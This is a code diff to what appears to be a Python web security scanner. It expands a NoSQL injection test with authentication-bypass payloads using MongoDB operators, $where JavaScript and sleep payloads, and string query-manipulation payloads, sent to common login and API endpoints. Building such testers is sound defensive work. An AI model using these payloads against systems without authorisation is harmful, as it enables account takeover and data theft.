@@ -180,38 +180,63 @@ class InjectionTester:
                     continue
 
     def test_nosql_injection(self):
-        """Test for NoSQL injection (MongoDB, etc.)."""
-        print(f"{Fore.YELLOW}[*] Testing NoSQL injection...{Style.RESET_ALL}")
+        """Test for advanced NoSQL injection (MongoDB, CouchDB, etc.)."""
+        print(f"{Fore.YELLOW}[*] Testing Advanced NoSQL injection vectors...{Style.RESET_ALL}")
 
         payloads = [
-            {'username': {'$ne': ''}, 'password': {'$ne': ''}},
-            {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
+            # Authentication Bypass via Operator Injection
+            {'username': {'$ne': None}, 'password': {'$ne': None}},
             {'username': {'$gt': ''}, 'password': {'$gt': ''}},
-            {'username': 'admin', 'password': {'$ne': 'x'}},
-            {'$where': 'this.username == "admin"'},
+            {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
+            {'username': {'$nin': ['admin', 'root']}, 'password': {'$ne': 'invalid'}},
+            # JavaScript evaluation / Sleep based ($where)
+            {'$where': 'this.password.match(/./)'},
+            {'$where': 'sleep(2)'},
+            {'username': {'$where': 'function(){return true;}'}},
+            # Query manipulation
+            'admin" || "1"=="1',
+            'admin" && this.password.match(/.*/)//',
+            'admin" || true || "',
+            #'$or': [ {}, { 'username': 'admin' } ]
         ]
 
-        for endpoint in ['/api/login', '/login', '/api/auth']:
+        # Extract NoSQL endpoints using Payload Updater if available, else fallback
+        endpoints = ['/api/login', '/login', '/api/auth', '/users/find', '/api/search', '/api/v1/user']
+
+        def run_nosql_test(endpoint):
             url = urljoin(self.base_url, endpoint)
             for payload in payloads:
                 try:
-                    response = self.session.post(url, json=payload, timeout=5)
-                    if response.status_code == 200:
-                        if any(k in response.text.lower() for k in ['token', 'session', 'welcome', 'dashboard', 'success']):
-                            self.findings.append({
-                                'title': 'NoSQL Injection',
-                                'description': f'NoSQL injection at {endpoint} — authentication bypass',
-                                'severity': 'CRITICAL',
-                                'category': 'injection',
-                                'owasp': 'A03:2021',
-                                'cwe': 'CWE-943',
-                                'remediation': 'Validate input types, use schema validation, sanitize MongoDB operators',
-                                'evidence': f'Payload {payload} returned success at {endpoint}',
-                                'mitre_attack': 'T1190'
-                            })
-                            return
+                    # Test as JSON body
+                    resp = self.session.post(url, json=payload, timeout=5)
+                    
+                    # Test as URL encoded (for platforms that parse array brackets in URL e.g. PHP/Express)
+                    if isinstance(payload, dict):
+                        # Simple flat representation for URL encoding
+                        params = {f"{k}[{list(v.keys())[0]}]": list(v.values())[0] for k,v in payload.items() if isinstance(v, dict)}
+                        resp_url = self.session.get(url, params=params, timeout=5)
+                    
+                    if resp.status_code == 200:
+                        if any(k in resp.text.lower() for k in ['token', 'session', 'welcome', 'dashboard', 'success', 'admin']):
+                            if 'error' not in resp.text.lower():
+                                self.findings.append({
+                                    'title': 'Advanced NoSQL Injection',
+                                    'description': f'NoSQL operator injection at {endpoint} — potential authentication bypass or data extraction',
+                                    'severity': 'CRITICAL',
+                                    'category': 'injection',
+                                    'owasp': 'A03:2021',
+                                    'api_owasp': 'API8:2023',
+                                    'cwe': 'CWE-943',
+                                    'remediation': 'Validate input types strictly (ensure strings are strings, not objects/dicts), use schema validation (Mongoose), sanitize MongoDB operators.',
+                                    'evidence': f'Payload {payload} returned 200 OK and success indicators at {endpoint}',
+                                    'mitre_attack': 'T1190'
+                                })
+                                return
                 except Exception:
                     continue
+                    
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            executor.map(run_nosql_test, endpoints)
 
     def test_os_command_injection(self):
         """Test for OS command injection."""
